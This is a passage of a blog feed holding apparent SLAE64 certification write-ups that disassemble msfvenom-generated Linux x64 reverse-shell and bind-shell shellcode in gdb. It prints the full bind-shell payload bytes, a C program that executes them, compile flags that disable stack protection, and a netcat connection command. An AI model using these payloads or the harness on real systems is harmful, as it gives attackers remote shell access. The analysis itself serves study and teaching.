+&lt;p&gt;I will be taking the same type of approach in the analysis of this payload as in the previous one for bind shellcode. There are 4 syscalls being executed so let’s go through them one by one. The concept of a reverse shellcode is that there is an attacker controlled machine somewhere where the attacker is waiting a connection back on a specific port and it is shellcode’s job to make initiate that connection.&lt;/p&gt;
+
+&lt;p&gt;For that to happen this generated payload makes use of a chain of syscalls –&amp;gt; it first creates a new &lt;code class=&quot;highlighter-rouge&quot;&gt;socket()&lt;/code&gt;, then attempts to &lt;code class=&quot;highlighter-rouge&quot;&gt;connect()&lt;/code&gt; to the attacker controlled machine and once it does, it launches the &lt;code class=&quot;highlighter-rouge&quot;&gt;execve()&lt;/code&gt; syscall.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/SLAE/msfvenom_syscall2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;1&lt;/strong&gt; - &lt;code class=&quot;highlighter-rouge&quot;&gt;socket()&lt;/code&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;syscall number, 0x29 is placed to &lt;code class=&quot;highlighter-rouge&quot;&gt;rax&lt;/code&gt; right in the beginning with 2 instructions &lt;code class=&quot;highlighter-rouge&quot;&gt;push 0x29&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;pop rax&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;cdq is then used to sign-extend the value in &lt;code class=&quot;highlighter-rouge&quot;&gt;rax&lt;/code&gt;, which means it would zero out &lt;code class=&quot;highlighter-rouge&quot;&gt;rdx&lt;/code&gt; which is pretty convenient&lt;/li&gt;
+  &lt;li&gt;with next push’es and pop’s 0x2 and 0x1 are placed to &lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;rsi&lt;/code&gt; respectively, so we could finally launch the &lt;code class=&quot;highlighter-rouge&quot;&gt;socket()&lt;/code&gt; syscall&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   0x0000000000601060 &amp;lt;code+0&amp;gt;:  push   0x29
+   0x0000000000601062 &amp;lt;code+2&amp;gt;:  pop    rax
+   0x0000000000601063 &amp;lt;code+3&amp;gt;:  cdq
+   0x0000000000601064 &amp;lt;code+4&amp;gt;:  push   0x2
+   0x0000000000601066 &amp;lt;code+6&amp;gt;:  pop    rdi
+   0x0000000000601067 &amp;lt;code+7&amp;gt;:  push   0x1
+   0x0000000000601069 &amp;lt;code+9&amp;gt;:  pop    rsi
+   0x000000000060106a &amp;lt;code+10&amp;gt;: syscall
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;2&lt;/strong&gt; - &lt;code class=&quot;highlighter-rouge&quot;&gt;connect()&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;To make a connection back to the attacker controlled machine, shellcode needs to contain important information like ip and port, in our case this is all displayed to us at offset +14 where hexadecimal value is moved to rcx. What that hexadecimal value &lt;code class=&quot;highlighter-rouge&quot;&gt;0xf02000a5c110002&lt;/code&gt; actually represents can be teared up to following bits:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;0002 - AF_INET, ipv4 address families&lt;/li&gt;
+  &lt;li&gt;5c11 - in little endian 115c converted to decimal gives us the port number 4444&lt;/li&gt;
+  &lt;li&gt;0x0a00020f is the hexadecimal format of an IP address 10.0.2.15&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;As &lt;code class=&quot;highlighter-rouge&quot;&gt;connect()&lt;/code&gt; syscall has 3 arguments &lt;code class=&quot;highlighter-rouge&quot;&gt;int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);&lt;/code&gt; we need to prepare the corresponding registers &lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;rsi&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;rdx&lt;/code&gt;. By pushing &lt;code class=&quot;highlighter-rouge&quot;&gt;rcx&lt;/code&gt; to the stack and then moving it to &lt;code class=&quot;highlighter-rouge&quot;&gt;rsi&lt;/code&gt; we prepare the 2nd argument. The following &lt;code class=&quot;highlighter-rouge&quot;&gt;push 0x10&lt;/code&gt; which we then immediately pop into &lt;code class=&quot;highlighter-rouge&quot;&gt;rdx&lt;/code&gt; is the overall size of the &lt;code class=&quot;highlighter-rouge&quot;&gt;sockaddr *addr&lt;/code&gt; structure, which is 16 bytes. And as usual, you can find the syscall number from &lt;code class=&quot;highlighter-rouge&quot;&gt;rax&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   0x000000000060106c &amp;lt;code+12&amp;gt;: xchg   rdi,rax
+   0x000000000060106e &amp;lt;code+14&amp;gt;: movabs rcx,0xf02000a5c110002
+   0x0000000000601078 &amp;lt;code+24&amp;gt;: push   rcx
+   0x0000000000601079 &amp;lt;code+25&amp;gt;: mov    rsi,rsp
+   0x000000000060107c &amp;lt;code+28&amp;gt;: push   0x10
+   0x000000000060107e &amp;lt;code+30&amp;gt;: pop    rdx
+   0x000000000060107f &amp;lt;code+31&amp;gt;: push   0x2a
+   0x0000000000601081 &amp;lt;code+33&amp;gt;: pop    rax
+   0x0000000000601082 &amp;lt;code+34&amp;gt;: syscall
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;3&lt;/strong&gt; - &lt;code class=&quot;highlighter-rouge&quot;&gt;dup2()&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Next we are duplicating file descriptors and as we have seen in the previous post about bind shell, msfvenon generates this part so that it is done in a loop for duplicating stdin-1, stdout-2 and stdout-3.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   0x0000000000601084 &amp;lt;code+36&amp;gt;: push   0x3
+   0x0000000000601086 &amp;lt;code+38&amp;gt;: pop    rsi
+   0x0000000000601087 &amp;lt;code+39&amp;gt;: dec    rsi
+   0x000000000060108a &amp;lt;code+42&amp;gt;: push   0x21
+   0x000000000060108c &amp;lt;code+44&amp;gt;: pop    rax
+   0x000000000060108d &amp;lt;code+45&amp;gt;: syscall
+   0x000000000060108f &amp;lt;code+47&amp;gt;: jne    0x601087 &amp;lt;code+39&amp;gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;4&lt;/strong&gt; - &lt;code class=&quot;highlighter-rouge&quot;&gt;execve()&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;and finally the reverse shell launches the &lt;code class=&quot;highlighter-rouge&quot;&gt;execve()&lt;/code&gt; syscall where &lt;code class=&quot;highlighter-rouge&quot;&gt;0x68732f6e69622f&lt;/code&gt; marks that the program to be launched is &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   0x0000000000601091 &amp;lt;code+49&amp;gt;: push   0x3b
+   0x0000000000601093 &amp;lt;code+51&amp;gt;: pop    rax
+   0x0000000000601094 &amp;lt;code+52&amp;gt;: cdq
+   0x0000000000601095 &amp;lt;code+53&amp;gt;: movabs rbx,0x68732f6e69622f
+   0x000000000060109f &amp;lt;code+63&amp;gt;: push   rbx
+   0x00000000006010a0 &amp;lt;code+64&amp;gt;: mov    rdi,rsp
+   0x00000000006010a3 &amp;lt;code+67&amp;gt;: push   rdx
+   0x00000000006010a4 &amp;lt;code+68&amp;gt;: push   rdi
+   0x00000000006010a5 &amp;lt;code+69&amp;gt;: mov    rsi,rsp
+   0x00000000006010a8 &amp;lt;code+72&amp;gt;: syscall
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So the whole concept of this shellcode looks pretty much as I have already described in the blog post about &lt;a href=&quot;../../blog/2019-01-25-blog-SLAE2/&quot;&gt;reverse shell&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/SLAE/bindreverse.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h4 id=&quot;related-posts&quot;&gt;Related posts:&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-01-15-blog-SLAE1/&quot;&gt;64-bit bindshell with a passphrase protection&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-01-25-blog-SLAE2/&quot;&gt;64-bit reverse shell with passphrase protection&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-02-25-blog-SLAE3/&quot;&gt;Egghunter (64-bit Linux) using access() syscall&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-02-25-blog-SLAE4/&quot;&gt;Writing a 64-bit custom encoder (reversed byte order of 4 byte chunks)&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE51/&quot;&gt;Msfvenom generated Exec shellcode analysis - exec shellcode&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE52/&quot;&gt;Msfvenom generated bind_tcp shellcode analysis&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE53/&quot;&gt;Msfvenom generated shell_reverse_tcp payload&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE6/&quot;&gt;Polymorphic shellcodes for samples taken from Shell-Storm&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE7/&quot;&gt;Custom encrypter - One-time pad (OTP)&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>Silvia Väli</name><email>silvia@protonmail.com</email></author><summary type="html">This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification. The task for 5.3/7 assignment is to analyse at least 3 shellcode examples created using Msfpayload for linux/x86_64. Since msfpayload is outdated, I used msfvenom instead. The analysis of the shellcodes is carried out using the gdb debugger and 3/3 shellcode analysed in this article is the shell_reverse_tcp payload.</summary></entry><entry><title type="html">Msfvenom generated bind_tcp shellcode analysis</title><link href="http://localhost:4000/blog/2019-05-01-blog-SLAE52/" rel="alternate" type="text/html" title="Msfvenom generated bind_tcp shellcode analysis" /><published>2019-05-01T00:00:00+03:00</published><updated>2019-05-01T00:00:00+03:00</updated><id>http://localhost:4000/blog/blog-SLAE52</id><content type="html" xml:base="http://localhost:4000/blog/2019-05-01-blog-SLAE52/">&lt;p&gt;This blog post has been created for completing the requirements of the &lt;a href=&quot;https://www.pentesteracademy.com/course?id=7&quot;&gt;SecurityTube Linux Assembly Expert Certification&lt;/a&gt;. The task for 5.2/7 assignment is to analyse at least 3 shellcode examples created using Msfpayload for linux/x86_64. Since msfpayload is outdated, I used msfvenom instead. The analysis of the shellcodes is carried out using the gdb debugger and 2/3 shellcode analysed in this article is the shell_bind_tcp payload.&lt;/p&gt;
+
+&lt;p&gt;&lt;b&gt;Student ID&lt;/b&gt;: SLAE64 - 1594&lt;/p&gt;
+
+&lt;h3 id=&quot;msfvenom-generated-linuxx64shell_bind_tcp-payload&quot;&gt;MSFvenom generated linux/x64/shell_bind_tcp payload&lt;/h3&gt;
+
+&lt;p&gt;As a follow up to analysing &lt;a href=&quot;/blog/2019-05-01-blog-SLAE51&quot;&gt;exec shellcode&lt;/a&gt;, the second payload I chose is the linux/x64/shell_bind_tcp payload. By description, this payload is used to spawn a command shell and listen for a connection. In order to generate the payload I used the following command:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p linux/x64/shell_bind_tcp -f c
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 86 bytes
+Final size of c file: 386 bytes
+unsigned char buf[] =
+&quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x52&quot;
+&quot;\xc7\x04\x24\x02\x00\x11\x5c\x48\x89\xe6\x6a\x10\x5a\x6a\x31&quot;
+&quot;\x58\x0f\x05\x6a\x32\x58\x0f\x05\x48\x31\xf6\x6a\x2b\x58\x0f&quot;
+&quot;\x05\x48\x97\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75&quot;
+&quot;\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00&quot;
+&quot;\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;shellcode-test-program&quot;&gt;Shellcode test program&lt;/h4&gt;
+
+&lt;p&gt;To analyse the generated payload I am placed it into the C program from where we will be executing the shellcode:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include&amp;lt;stdio.h&amp;gt;
+#include&amp;lt;string.h&amp;gt;
+
+unsigned char code[] = \
+&quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x52&quot;
+&quot;\xc7\x04\x24\x02\x00\x11\x5c\x48\x89\xe6\x6a\x10\x5a\x6a\x31&quot;
+&quot;\x58\x0f\x05\x6a\x32\x58\x0f\x05\x48\x31\xf6\x6a\x2b\x58\x0f&quot;
+&quot;\x05\x48\x97\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75&quot;
+&quot;\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00&quot;
+&quot;\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;;
+
+int main()
+{
+  printf(&quot;Shellcode Length:  %d\n&quot;, (int)strlen(code));
+        int (*ret)() = (int(*)())code;
+        ret();
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;and finally compiled the C program as follows:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gcc -m64 -fno-stack-protector -z execstack testshellcode.c -o testshellcode -no-pie
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;analysis&quot;&gt;Analysis&lt;/h3&gt;
+
+&lt;p&gt;Examining the generated shellcode in gdb, shows us that 6 syscalls will be executed, so let’s divide our analysis into 6 separate steps.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/SLAE/msfvenom_syscalls.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;1&lt;/strong&gt; - &lt;code class=&quot;highlighter-rouge&quot;&gt;socket()&lt;/code&gt; syscall&lt;/p&gt;
+
+&lt;p&gt;We can see that the 1st syscall is the socket syscall, as &lt;code class=&quot;highlighter-rouge&quot;&gt;rax&lt;/code&gt; is initialized to 0x29 (41). From &lt;code class=&quot;highlighter-rouge&quot;&gt;socket&lt;/code&gt; syscall man page, we can easily validate that this syscall takes 3 arguments and as a result will return a file descriptor.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt; –&amp;gt; 0x2 for AF_INET&lt;br /&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;rsi&lt;/code&gt; –&amp;gt; 0x1 for type SOCKSTREAM&lt;br /&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;rdx&lt;/code&gt; –&amp;gt; 0x0 for protocol. &lt;code class=&quot;highlighter-rouge&quot;&gt;rdx&lt;/code&gt; is zeroed out with the cdq instruction&lt;br /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Dump of assembler code from 0x601060 to 0x6010b6:
+=&amp;gt; 0x0000000000601060 &amp;lt;code+0&amp;gt;:	push   0x29
+   0x0000000000601062 &amp;lt;code+2&amp;gt;:	pop    rax
+   0x0000000000601063 &amp;lt;code+3&amp;gt;:	cdq
+   0x0000000000601064 &amp;lt;code+4&amp;gt;:	push   0x2
+   0x0000000000601066 &amp;lt;code+6&amp;gt;:	pop    rdi
+   0x0000000000601067 &amp;lt;code+7&amp;gt;:	push   0x1
+   0x0000000000601069 &amp;lt;code+9&amp;gt;:	pop    rsi
+   0x000000000060106a &amp;lt;code+10&amp;gt;:	syscall
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;2&lt;/strong&gt; - &lt;code class=&quot;highlighter-rouge&quot;&gt;bind()&lt;/code&gt; syscall&lt;/p&gt;
+
+&lt;p&gt;The usecase for the &lt;code class=&quot;highlighter-rouge&quot;&gt;bind()&lt;/code&gt; syscall is to bind to the socket created in step 1. The way to identify the &lt;code class=&quot;highlighter-rouge&quot;&gt;bind()&lt;/code&gt; syscall here are the 2 lines just before the &lt;code class=&quot;highlighter-rouge&quot;&gt;syscall&lt;/code&gt; instruction. Value 0x31 is pushed to the stack and then right after, popped to rax, which by convention is where we need to have the syscall number.&lt;/p&gt;
+
+&lt;p&gt;Looking at the layout of a bind ` int bind(int sockfd, const struct sockaddr *addr,socklen_t addrlen);&lt;code class=&quot;highlighter-rouge&quot;&gt; syscall we can get the most important bits of information for us (ip address and the port) if we understand the &lt;/code&gt;sockaddr *addr&lt;code class=&quot;highlighter-rouge&quot;&gt; structure. By looking at line &lt;/code&gt;mov DWORD PTR [rsp],0x5c110002` we can deduct the following:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;02 –&amp;gt; AF_INET for ipv4 address family&lt;/li&gt;
+  &lt;li&gt;00 –&amp;gt; INADDR_ANY, so it will try to connect to 0.0.0.0&lt;/li&gt;
+  &lt;li&gt;5c11 –&amp;gt; is in the network byte order (big endian). Once we change that to little endian 115c and convert it to decimal, we get that the port this shellcode is trying to connect to is 4444&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   0x000000000060106c &amp;lt;code+12&amp;gt;:	xchg   rdi,rax
+   0x000000000060106e &amp;lt;code+14&amp;gt;:	push   rdx
+   0x000000000060106f &amp;lt;code+15&amp;gt;:	mov    DWORD PTR [rsp],0x5c110002
+   0x0000000000601076 &amp;lt;code+22&amp;gt;:	mov    rsi,rsp
+   0x0000000000601079 &amp;lt;code+25&amp;gt;:	push   0x10
+   0x000000000060107b &amp;lt;code+27&amp;gt;:	pop    rdx
+   0x000000000060107c &amp;lt;code+28&amp;gt;:	push   0x31
+   0x000000000060107e &amp;lt;code+30&amp;gt;:	pop    rax
+   0x000000000060107f &amp;lt;code+31&amp;gt;:	syscall
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;3&lt;/strong&gt; - &lt;code class=&quot;highlighter-rouge&quot;&gt;listen()&lt;/code&gt; syscall&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;listen()&lt;/code&gt; syscall corresponds to 0x32 (50) and by convention is takes 2 arguments &lt;code class=&quot;highlighter-rouge&quot;&gt;int listen(int sockfd, int backlog);&lt;/code&gt; Since &lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt; is already prepared for us from previous syscalls, all we will see here is the preparation of the syscall value for &lt;code class=&quot;highlighter-rouge&quot;&gt;rax&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   0x0000000000601081 &amp;lt;code+33&amp;gt;:	push   0x32
+   0x0000000000601083 &amp;lt;code+35&amp;gt;:	pop    rax
+   0x0000000000601084 &amp;lt;code+36&amp;gt;:	syscall
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;4&lt;/strong&gt; - &lt;code class=&quot;highlighter-rouge&quot;&gt;accept()&lt;/code&gt; syscall&lt;/p&gt;
+
+&lt;p&gt;Once we are listening on the port, the next thing what should happen is some other party initiating a connection. When that happens, shellcode should be able to accept that incoming connection. This is where &lt;code class=&quot;highlighter-rouge&quot;&gt;accept()&lt;/code&gt; syscall comes into play.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   0x0000000000601086 &amp;lt;code+38&amp;gt;:	xor    rsi,rsi
+   0x0000000000601089 &amp;lt;code+41&amp;gt;:	push   0x2b
+   0x000000000060108b &amp;lt;code+43&amp;gt;:	pop    rax
+   0x000000000060108c &amp;lt;code+44&amp;gt;:	syscall
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;5&lt;/strong&gt; - &lt;code class=&quot;highlighter-rouge&quot;&gt;dup2()&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;dup2()&lt;/code&gt; goes by the syscall number 0x21 (33) and it takes 2 arguments &lt;code class=&quot;highlighter-rouge&quot;&gt;int dup2(int oldfd, int newfd);&lt;/code&gt;, the old file descriptor in &lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt; and the new file descriptor in &lt;code class=&quot;highlighter-rouge&quot;&gt;rsi&lt;/code&gt;. As we need to apply it for stdin, stdout and stderr, which correspond to the numbers 0,1 and 2, it makes sense to do it in a loop and this is exactly what msfvenom has generated for us. each round &lt;code class=&quot;highlighter-rouge&quot;&gt;rsi&lt;/code&gt; is decremented by 1, and then checked in the end of the loop whether or not it has reached to 0.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   0x000000000060108e &amp;lt;code+46&amp;gt;:	xchg   rdi,rax
+   0x0000000000601090 &amp;lt;code+48&amp;gt;:	push   0x3
+   0x0000000000601092 &amp;lt;code+50&amp;gt;:	pop    rsi
+   0x0000000000601093 &amp;lt;code+51&amp;gt;:	dec    rsi
+   0x0000000000601096 &amp;lt;code+54&amp;gt;:	push   0x21
+   0x0000000000601098 &amp;lt;code+56&amp;gt;:	pop    rax
+   0x0000000000601099 &amp;lt;code+57&amp;gt;:	syscall
+   0x000000000060109b &amp;lt;code+59&amp;gt;:	jne    0x601093 &amp;lt;code+51&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;6&lt;/strong&gt; - &lt;code class=&quot;highlighter-rouge&quot;&gt;execve()&lt;/code&gt; the finale&lt;/p&gt;
+
+&lt;p&gt;This shellcode ends up executing the &lt;code class=&quot;highlighter-rouge&quot;&gt;execve&lt;/code&gt; syscall, which all of us are now way too familiar with from my previous posts, but for the sake of it let’s go through it again :). So &lt;code class=&quot;highlighter-rouge&quot;&gt;execve()&lt;/code&gt; goes by the 0x3b (59) syscall number and it takes 3 arguments.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;instruction &lt;code class=&quot;highlighter-rouge&quot;&gt;cdq&lt;/code&gt; allows us conveniently to sign-extend the value in &lt;code class=&quot;highlighter-rouge&quot;&gt;rax&lt;/code&gt; and make sure that &lt;code class=&quot;highlighter-rouge&quot;&gt;rdx&lt;/code&gt; is zeroed out. This is what would hold the environment variables if we wanted to pass any.&lt;/li&gt;
+  &lt;li&gt;With instructions at offsets +65, +75 and +76 we place the address with the program name which we want to execute, &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;, to &lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;with instructions at offsets +79, +80 and +81 we first place the address from &lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt; to the stack again. So we end up with an address at &lt;code class=&quot;highlighter-rouge&quot;&gt;rsp&lt;/code&gt; pointing to the address where we have stored string &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;. Image addr –&amp;gt; addr –&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   0x000000000060109d &amp;lt;code+61&amp;gt;:	push   0x3b
+   0x000000000060109f &amp;lt;code+63&amp;gt;:	pop    rax
+   0x00000000006010a0 &amp;lt;code+64&amp;gt;:	cdq
+   0x00000000006010a1 &amp;lt;code+65&amp;gt;:	movabs rbx,0x68732f6e69622f
+   0x00000000006010ab &amp;lt;code+75&amp;gt;:	push   rbx
+   0x00000000006010ac &amp;lt;code+76&amp;gt;:	mov    rdi,rsp
+   0x00000000006010af &amp;lt;code+79&amp;gt;:	push   rdx
+   0x00000000006010b0 &amp;lt;code+80&amp;gt;:	push   rdi
+   0x00000000006010b1 &amp;lt;code+81&amp;gt;:	mov    rsi,rsp
+   0x00000000006010b4 &amp;lt;code+84&amp;gt;:	syscall
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;To test out the msfvenom generated payload simply run the compiled version of the payload and open another tab to make the connection &lt;code class=&quot;highlighter-rouge&quot;&gt;nc 0.0.0.0 4444&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h4 id=&quot;related-posts&quot;&gt;Related posts:&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-01-15-blog-SLAE1/&quot;&gt;64-bit bindshell with a passphrase protection&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-01-25-blog-SLAE2/&quot;&gt;64-bit reverse shell with passphrase protection&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-02-25-blog-SLAE3/&quot;&gt;Egghunter (64-bit Linux) using access() syscall&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-02-25-blog-SLAE4/&quot;&gt;Writing a 64-bit custom encoder (reversed byte order of 4 byte chunks)&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE51/&quot;&gt;Msfvenom generated Exec shellcode analysis - exec shellcode&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE52/&quot;&gt;Msfvenom generated bind_tcp shellcode analysis&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE53/&quot;&gt;Msfvenom generated shell_reverse_tcp payload&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE6/&quot;&gt;Polymorphic shellcodes for samples taken from Shell-Storm&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE7/&quot;&gt;Custom encrypter - One-time pad (OTP)&lt;/a&gt;&lt;/li&gt;
